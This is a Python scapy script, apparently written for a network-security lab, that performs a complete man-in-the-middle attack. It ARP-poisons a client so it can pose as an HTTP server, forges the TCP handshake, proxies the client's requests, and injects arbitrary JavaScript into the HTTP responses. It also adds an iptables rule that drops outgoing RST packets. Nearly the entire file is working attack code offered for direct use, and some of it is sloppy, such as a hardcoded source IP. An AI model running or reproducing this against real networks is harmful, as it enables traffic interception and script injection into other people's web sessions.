import argparse
import atexit
import os

from scapy.all import ARP, Ether, IP, TCP
from scapy.all import conf, get_if_hwaddr, srp1, send, sendp, sniff
from scapy.layers.http import HTTP, HTTPResponse, HTTPRequest, TCP_client, Raw


class MyArpSpoofing:

    def __init__(self, interface, client_ip, http_ip, script):
        # set scapy config
        conf.iface = self.interface = interface
        # set mac/ip
        self.attacker_ip = [e[4] for e in conf.route.routes if e[3] == interface][0]
        self.attacker_mac = get_if_hwaddr(interface)
        self.client_ip = client_ip
        self.client_mac = self._get_mac_by_ip(target_ip=client_ip)
        self.http_ip = http_ip
        self.http_mac = self._get_mac_by_ip(target_ip=http_ip)
        self.script = script
        self.seq = 1000
        # this command will disable system network process,
        # which allow scapy to do packet level TCP handshake
        cmd1 = f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 10.4.22.208 -j DROP"
        os.system(cmd1)
        # resume client's arp cache on exit
        atexit.register(self._resume_client_arp_cache)

    def run(self):
        """(blocking) sniff and manipulate target packet"""
        self._poison_client_arp_cache()

        def interceptor(p):
            """handler of intercepted packets"""
            # APR packet
            if p.haslayer(ARP) and p[ARP].op == 1:
                self._poison_client_arp_cache()
            # TCP/HTTP handshake (SYN) packet
            elif p.haslayer(TCP) and str(p[TCP].flags) == "S" and \
                    p[IP].src == self.client_ip and p[IP].dst == self.http_ip:
                self._mitm_tcp_handshake(p)
            # HTTP Request packet
            elif p.haslayer(TCP) and p.haslayer(HTTPRequest):
                self._mitm_http_req(p)
            # FIN (connection teardown)
            elif p.haslayer(TCP) and str(p[TCP].flags) == "FA":
                self._poison_client_arp_cache(verbose=False)
                l2_l3 = Ether(src=self.attacker_mac, dst=self.client_mac) / \
                        IP(src=self.http_ip, dst=self.client_ip)
                ack = TCP(dport=p[TCP].sport, sport=p[TCP].dport, flags="A", seq=p.ack, ack=p.seq + 1)
                sendp(l2_l3 / ack, verbose=False)

        # run
        print("# start sniffing...")
        f = f"(ether src {self.client_mac}) or (src host {self.http_ip})"
        sniff(prn=interceptor, filter=f, count=65536)

    def _poison_client_arp_cache(self, verbose=True):
        """poison client's arp cache"""
        spoof_http_arp = ARP(op=2, hwdst=self.client_mac, pdst=self.client_ip, psrc=self.http_ip)
        send(spoof_http_arp, verbose=False)
        if verbose is True:
            print("# ARP Cache is poisoned!")

    def _resume_client_arp_cache(self, verbose=True):
        """resume client's arp cache """
        normal_http_arp = ARP(op=2, hwdst=self.client_mac, pdst=self.client_ip, psrc=self.http_ip, hwsrc=self.http_mac)
        send(normal_http_arp, verbose=False)
        if verbose is True:
            print("# ARP Cache is resumed!")

    def _mitm_tcp_handshake(self, syn):
        """make fake tcp handshake, client would believe it is handshaking with http server,
        but it is the attacker who responses"""
        l2_l3 = Ether(src=self.attacker_mac, dst=self.client_mac) / IP(src=self.http_ip, dst=self.client_ip)
        syn_ack = TCP(dport=syn[TCP].sport, sport=syn[TCP].dport, flags="SA",
                      seq=self.seq, ack=syn.seq + 1, )
        r = srp1(l2_l3 / syn_ack, verbose=False)
        counter = 0
        while r.ack != self.seq + 1 and counter < 5:
            counter += 1
            r = srp1(l2_l3 / syn_ack, timeout=1, verbose=False)

    def _mitm_http_req(self, http_req):
        """do proxy http request and response with injected payload"""
        # response ack first
        l2_l3 = Ether(src=self.attacker_mac, dst=self.client_mac) / IP(src=self.http_ip, dst=self.client_ip)
        ack = TCP(dport=http_req[TCP].sport, sport=http_req[TCP].dport, flags="A",
                  seq=http_req.ack, ack=http_req.seq + 1)
        sendp(l2_l3 / ack, verbose=False)
        # send proxy request and get response
        ip = http_req[HTTPRequest].Host.decode(encoding="ascii")
        port = http_req[TCP].dport
        proxy_http_req = HTTP() / http_req[HTTPRequest]
        http_res = TCP_client.tcplink(proto=HTTP, ip=ip, port=port).sr1(proxy_http_req, verbose=False)

        # inject js into payload and forward packets recursively
        def rec_forward_load(load, seq, template_p, total_len=None, window_size=167):
            total_len = total_len if total_len is not None else len(load)
            l2 = Ether(src=self.attacker_mac, dst=self.client_mac)
            l3 = IP(src=self.http_ip, dst=self.client_ip)
            if len(load) > window_size:
                this_load, rest_load = load[:window_size], load[window_size:]
                l4 = TCP(dport=http_req[TCP].sport, flags="PA", seq=seq, ack=http_req.seq + 1)
                p = l2 / l3 / l4 / template_p
                p = MyUtil.set_load(p, this_load, rest_len=len(rest_load) - 2)  # I don't know why -2
                sendp(p, verbose=False)
                rec_forward_load(load=rest_load, seq=seq + window_size, template_p=template_p,
                                 total_len=total_len, window_size=window_size)
            else:  # last packet
                l4 = TCP(dport=http_req[TCP].sport, flags="FA", seq=seq, ack=http_req.seq + 1)
                p = l2 / l3 / l4 / template_p
                p = MyUtil.set_load(p, load, rest_len=0)
                sendp(p, verbose=False)

        new_load = http_res[Raw].load.replace(b"</body>", f"<script>{self.script}</script></body>".encode("ascii"))
        rec_forward_load(load=new_load, seq=http_req.ack, template_p=http_res)

    def _get_mac_by_ip(self, target_ip):
        """get mac address of an IP by arp query """
        ether = Ether(src=self.attacker_mac, dst="ff:ff:ff:ff:ff:ff")  # ff:ff:ff:ff:ff:ff is the addr for broadcast
        arp_packet = ARP(op=1, hwsrc=self.attacker_mac, psrc=self.attacker_ip, pdst=target_ip)
        arp_response = srp1(ether / arp_packet, verbose=False)
        return arp_response.src


class MyUtil:

    @staticmethod
    def get_args():
        """parse terminal args"""
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", "-i", dest="i", required=True)
        parser.add_argument("-ip1", "--clientIP", dest="c", required=True)
        parser.add_argument("-ip2", "--serverIP", dest="s", required=True)
        parser.add_argument("-s", "--script", dest="src", required=True)
        args = parser.parse_args()
        return args.i, args.c, args.s, args.src

    @staticmethod
    def set_load(packet, load, rest_len=0):
        packet[Raw].load = load
        packet[HTTPResponse].Content_Length = str(len(load) + rest_len).encode("ascii")
        del packet[IP].len
        del packet[IP].chksum
        del packet[TCP].chksum
        return packet


if __name__ == "__main__":
    """python3 3.py -i eth0 --clientIP 10.4.22.53 --serverIP 10.4.22.81 --script 'alert("Bang!")'"""
    INTERFACE, CLIENT_IP, SERVER_IP, SCRIPT = MyUtil.get_args()
    print(INTERFACE)
    arpSpoofing = MyArpSpoofing(interface=INTERFACE, client_ip=CLIENT_IP, http_ip=SERVER_IP, script=SCRIPT)
    print(f"# ")
    print(f"# ==================== running 4-2-1.py ====================")
    print(f"#")
    print(f"# args")
    print(f"#   i        : {INTERFACE}")
    print(f"#   clientIP : {CLIENT_IP}")
    print(f"#   serverIP : {SERVER_IP}")
    print(f"#   script   : {SCRIPT}")
    print(f"#")
    print(f"# Normal MAC/IP Mapping")
    print(f"#   Interface: {arpSpoofing.interface}")
    print(f"#   Attacker : {arpSpoofing.attacker_mac}{' ' * 4}{arpSpoofing.attacker_ip}")
    print(f"#   Client   : {arpSpoofing.client_mac}{' ' * 4}{arpSpoofing.client_ip}")
    print(f"#   HTTP     : {arpSpoofing.http_mac}{' ' * 4}{arpSpoofing.http_ip}")
    print(f"#   SRC      : {arpSpoofing.script}")
    print(f"# ==========================================================")
    # run
    arpSpoofing.run()
